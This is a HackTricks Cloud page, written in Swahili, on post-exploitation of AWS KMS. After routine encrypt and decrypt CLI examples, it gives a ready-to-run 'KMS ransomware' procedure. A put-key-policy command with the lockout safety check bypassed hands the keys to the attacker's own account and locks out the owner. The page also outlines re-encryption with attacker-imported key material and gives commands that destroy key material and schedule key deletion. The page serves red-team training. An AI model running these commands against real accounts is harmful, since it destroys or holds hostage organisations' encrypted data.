# AWS - KMS Post Exploitation

{% hint style="success" %}
Jifunze na kufanya mazoezi ya Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na kufanya mazoezi ya Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mipango ya usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## KMS

Kwa maelezo zaidi angalia:

{% content-ref url="../../aws-security/aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../../aws-security/aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### Encrypt/Decrypt information

* Kutumia **symmetric** key
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
* Kutumia **asymmetric** key:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
{% hint style="warning" %}
Ikiwa unapokea hitilafu 'An error occurred (InvalidCiphertextException) when calling the Decrypt operation:' wakati wa kujaribu kufanya kms decrypt jaribu kutumia **`--ciphertext-blob file://`** badala ya **`fileb://`**.

Matumizi ya **`file://`** yanakupa urahisi wa kutumia faili zilizoandikwa kwa usimbaji unaopendelea unapotumia CLI.
Katika matoleo ya 1.6.3 na juu ya CLI, unapata njia nyingine ya kupitisha yaliyomo ya faili kwa CLI, **`fileb://`**. Inafanya kazi sawa na **`file://`**, lakini badala ya kusoma yaliyomo ya faili kama maandishi, inasomwa kama binary.

Kwa kesi nyingi, **`file://`** itatosheleza matumizi yako ya kupitisha yaliyomo ya faili kama pembejeo. Hata hivyo, kuna baadhi ya kesi ambapo **`fileb://`** lazima itumike kupitisha yaliyomo ya faili kama binary badala ya maandishi.
Soma zaidi kutoka AWS hapa: [AWS Blog - Best Practice for Local File Parameters](https://aws.amazon.com/blogs/developer/best-practices-for-local-file-parameters/)
{% endhint %}

### KMS Ransomware

Mshambuliaji mwenye ufikiaji wa kipekee juu ya KMS anaweza kubadilisha sera ya KMS ya funguo na **kumpa akaunti yake ufikiaji juu yao**, kuondoa ufikiaji uliotolewa kwa akaunti halali.

Kisha, watumiaji wa akaunti halali hawataweza kufikia taarifa yoyote ya huduma yoyote ambayo imefichwa na funguo hizo, ikitengeneza ransomware rahisi lakini yenye ufanisi juu ya akaunti.

{% hint style="warning" %}
Kumbuka kuwa **funguo zinazodhibitiwa na AWS hazijaathiriwa** na shambulio hili, ni **funguo zinazodhibitiwa na Mteja** pekee.

Pia kumbuka hitaji la kutumia param **`--bypass-policy-lockout-safety-check`** (ukosefu wa chaguo hili katika web console hufanya shambulio hili liwezekane tu kutoka CLI).
{% endhint %}
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
{% hint style="danger" %}
Kumbuka kwamba ukibadilisha sera hiyo na kutoa ufikiaji kwa akaunti ya nje tu, na kisha kutoka akaunti hii ya nje ujaribu kuweka sera mpya ili **kutoa ufikiaji tena kwa akaunti ya awali, hutaweza**.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

#### Global KMS Ransomware

Kuna njia nyingine ya kufanya Global KMS Ransomware, ambayo ingehusisha hatua zifuatazo:

* Kuunda **ufunguo mpya na nyenzo za ufunguo** zilizoingizwa na mshambuliaji
* **Kusimba upya data ya zamani** iliyosimbwa na toleo la awali kwa kutumia toleo jipya.
* **Kufuta ufunguo wa KMS**
* Sasa ni mshambuliaji pekee, ambaye ana nyenzo za ufunguo wa awali, ndiye atakayeweza kusimbua data iliyosimbwa

### Kuangamiza funguo
```bash
# Destoy they key material previously imported making the key useless
aws kms delete-imported-key-material --key-id 1234abcd-12ab-34cd-56ef-1234567890ab

# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
{% hint style="danger" %}
Kumbuka kuwa AWS sasa **inazuia vitendo vya awali kufanywa kutoka akaunti ya msalaba:**
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mipango ya usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
